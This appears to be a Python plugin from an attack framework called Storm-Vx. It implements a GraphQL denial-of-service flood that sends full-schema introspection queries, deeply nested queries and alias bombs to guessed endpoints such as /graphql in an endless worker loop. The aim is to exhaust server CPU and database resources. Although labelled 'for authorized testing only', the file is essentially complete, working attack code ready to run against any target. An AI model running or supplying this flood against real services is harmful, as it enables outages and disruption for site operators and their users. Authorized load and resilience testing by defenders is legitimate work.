#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_graphql_introspection — GraphQL Introspection Flood Attack Plugin

Sends heavy GraphQL introspection queries and deeply nested
queries to exhaust server CPU and database resources. GraphQL
servers must parse, validate, and execute complex query trees,
making this a CPU-intensive attack vector.
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import json
from typing import Dict, Any


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str

try:
    import aiohttp
    _HAS_AIOHTTP = True
except ImportError:
    aiohttp = None
    _HAS_AIOHTTP = False


__all__ = ["GraphqlIntrospectionPlugin"]


# ─── Pre-built heavy GraphQL queries ──────────────────────────────────────────

INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind ofType { name kind ofType { name kind } } }
        }
      }
      inputFields {
        name
        type { name kind ofType { name kind } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
"""

DEEPLY_NESTED_QUERY = """
{{
  {alias}: {field} {{
    {inner_field} {{
      {inner_field2} {{
        {inner_field3} {{
          id
          name
          createdAt
          updatedAt
        }}
      }}
    }}
  }}
}}
"""


class GraphqlIntrospectionPlugin(AttackPlugin):
    """GraphQL Introspection Flood — heavy queries to exhaust CPU/database.

    Targets GraphQL endpoints with introspection queries (which dump
    the entire schema) and deeply nested queries. These require
    significant server-side parsing, validation, and resolver
    execution, making them expensive per-request.
    """

    meta = PluginMeta(
        name='graphql_introspection',
        version='1.0.0',
        plugin_type='attack',
        description='GraphQL introspection — heavy queries to exhaust server CPU/database',
        tags=['http', 'graphql', 'api', 'cpu-burn', 'introspection'],
        priority=43,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def _build_heavy_query(self) -> str:
        """Build a random heavy GraphQL query."""
        query_type = random.choice(["introspection", "nested", "alias_bomb"])

        if query_type == "introspection":
            return INTROSPECTION_QUERY

        elif query_type == "nested":
            # Deeply nested query with random field names
            field = random.choice(["users", "posts", "comments", "orders", "products"])
            inner = random.choice(["edges", "node", "items", "results", "data"])
            inner2 = random.choice(["children", "related", "connections", "refs"])
            inner3 = random.choice(["details", "metadata", "attributes", "info"])
            alias = f"q{rand_str(4)}"
            return DEEPLY_NESTED_QUERY.format(
                alias=alias, field=field,
                inner_field=inner, inner_field2=inner2, inner_field3=inner3,
            )

        else:  # alias_bomb
            # Many aliases pointing to same field = N resolvers
            aliases = [f"a{i}_{rand_str(3)}" for i in range(random.randint(10, 30))]
            field = random.choice(["users", "posts", "orders", "products"])
            lines = [f"  {alias}: {field} {{ id name }}" for alias in aliases]
            return "{\n" + "\n".join(lines) + "\n}"

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """GraphQL introspection flood worker."""
        if not _HAS_AIOHTTP:
            return

        _ssl = context.ssl_param

        pages = context.page_targets or [context.url]
        delay_ms = context.extra.delay_ms

        # Find GraphQL endpoint — try common paths
        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql",
                         "/query", "/api/query", "/gql"]
        base_urls = [context.site_root + p for p in graphql_paths]
        # Also try page targets (might be GraphQL endpoints)
        all_targets = list(set(base_urls + pages))

        while not self._stop_event.is_set():
            try:
                url = random.choice(all_targets)
                headers = self._get_fresh_headers(context, "api")
                headers["Content-Type"] = "application/json"

                query = self._build_heavy_query()
                payload = json.dumps({"query": query, "operationName": f"op{rand_str(4)}"})

                t = time.time()
                try:
                    async with context.session.post(url, headers=headers, data=payload,
                                                    ssl=_ssl, allow_redirects=False) as resp:
                        rt = time.time() - t
                        ok = resp.status < 500
                        await self._record("GQL", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    if _HAS_AIOHTTP and isinstance(exc, aiohttp.ClientError):
                        rt = time.time() - t
                        await self._record("GQL", False, 0, rt,
                                           err=type(exc).__name__, url=url[:60])
                    elif isinstance(exc, (asyncio.TimeoutError, OSError)):
                        rt = time.time() - t
                        await self._record("GQL", False, 0, rt,
                                           err=type(exc).__name__, url=url[:60])
                    else:
                        raise

                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0)

            except asyncio.CancelledError:
                return
            except Exception as exc:
                if _HAS_AIOHTTP and isinstance(exc, aiohttp.ClientError):
                    await self._record("GQL", False, 0, 0, err=type(exc).__name__)
                elif isinstance(exc, (asyncio.TimeoutError, OSError)):
                    await self._record("GQL", False, 0, 0, err=type(exc).__name__)
                else:
                    raise
                await asyncio.sleep(0.1)

